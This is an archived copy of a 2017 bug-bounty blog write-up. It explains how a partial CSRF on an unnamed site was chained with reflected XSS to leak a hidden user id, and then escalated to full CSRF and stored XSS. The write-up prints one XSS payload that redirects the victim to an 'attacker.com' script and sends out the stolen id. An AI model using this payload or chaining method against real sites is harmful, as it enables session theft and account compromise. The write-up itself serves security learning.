---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-19_that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-st.md
original_filename: 2017-07-19_that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-st.md
title: 'That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF
  to Stored XSS'
category: documents
detected_topics:
- xss
- idor
- command-injection
- otp
- csrf
- api-security
tags:
- imported
- documents
- xss
- idor
- command-injection
- otp
- csrf
- api-security
language: en
raw_sha256: 40ec170fc4b0c1ebeeabb965b5585a3af70c78a59942bbee14e6a92d8d63f3fb
text_sha256: 1c62e424f0da6968bac926d2053afb465cc892dd419c7f385fa3cdcf1609c5db
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-19_that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-st.md
- Source Type: markdown
- Detected Topics: xss, idor, command-injection, otp, csrf, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `40ec170fc4b0c1ebeeabb965b5585a3af70c78a59942bbee14e6a92d8d63f3fb`
- Text SHA256: `1c62e424f0da6968bac926d2053afb465cc892dd419c7f385fa3cdcf1609c5db`


## Content

---
title: "That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS"
url: "https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2"
authors: ["Mandeep Jadon (@1337tr0lls)"]
bugs: ["CSRF", "Reflected XSS", "Stored XSS"]
publication_date: "2017-07-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6149
scraped_via: "browseros"
---

# That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS

Mandeep Jadon
Follow
3 min read
·
Jul 19, 2017

43

3

That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS

Press enter or click to view image in full size
CSRF And XSS

Hey buddies so typically this is my first post on medium . I hope you like it . :) . Please excuse my informal writing flow .

So this is about how I chained one bug after the other to get stored XSS and CSRF . So lets jump into it :

Lets call the site , site.com . On digging up the site one of the forms was susceptible to CSRF .So as usual i shot my request through engagement tools and generated a CSRF POC through Burp !

And guess what It worked like charm . I was happy (Sometimes it happens while hunting bugs , you start celebrating your success and later realize you did some stupid shit and ignored something ). Similar thing happened couple of months back when I though I found an IDOR , later realized I was hacking my own freaking account (Some User ID confusions) .

Anyways Keeping it aside .

So I realized that there was this stupid id parameter that was passed in the POST request that was unique that didn't let me do the CSRF . So let me rephrase my bug and call it ‘partial CSRF’.

So there was a good news and a bad news :

1.There was no anti CSRF token in the POST body nor in the header .
2.There was a id (6 digits) that was sent along other parameters in the post request , that was acting kinda like a anti CSRF token .

So there was no way i could do the CSRF attack (Shoot up comments if you have some ideas) . This was depressing !

After digging little further, I found one of the paramters in the POST request was vulnerable to XSS (Call me lucky , cause normally you wont find CSRF and XSS at the same place) .

So I had two bugs in hand :

Get Mandeep Jadon’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

1. Patial CSRF : I was not able to do changes in the victims account since it gave error that id is not valid .
2. Reflected XSS : I could still toss up cookies to my server . So yeah it was a real bug .

So now I had a real bug in hand . But I wanted to do CSRF because if it gets executed I can get a stored XSS . :)

For doing the CSRF I had to get the value of ID somehow . For getting the value of the ID I had XSS in hand:) . But God had different plans for me .

Unfortunately the form after doing a partial CSRF loads up the bogus id value that we forged . So it was not possible to get the ID value from that form (Shit ! It became tongue twister) . :( So I started building up the payload that would redirect me to the page that has the ID and fetch it for me . Unfortunately after several attempts I was not able to do so , Why ?
Because when the new page loads up , the rest of the Javascript was not able to execute . (There may be definately some workarounds . Also correct me if I am wrong:) ) . I tried to using XHR , But still somehow the ID was not fetched .

So I though and thought and thought . I did over thought and slept .

Later again luck came into play . I analysed the page source of the forged form (Which was obtained after partial CSRF) for the ID at some other place . Fortunately , I found that Id hidden in one of the html element . Hey bhagwaan !!!! BC pehle kyon nhin dikha .

So now the work was easy :

The payload was pretty basic one :
KadiNinda”><ScRipt>location.href = ‘http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById("id").value;</sCriPt>

This would send a GET request containing the Id value for that user to my server . I Verified it using console network tab in the browser .

2. Once I had the id, Its pretty basic do a FULL CSRF and a Stored XSS .

So Victory .

That was all for the post .

PS : This is my page , Ultimate1337trolls . Where I do lots of leet trolls . Would appreciate if you join the leet gang ! :D
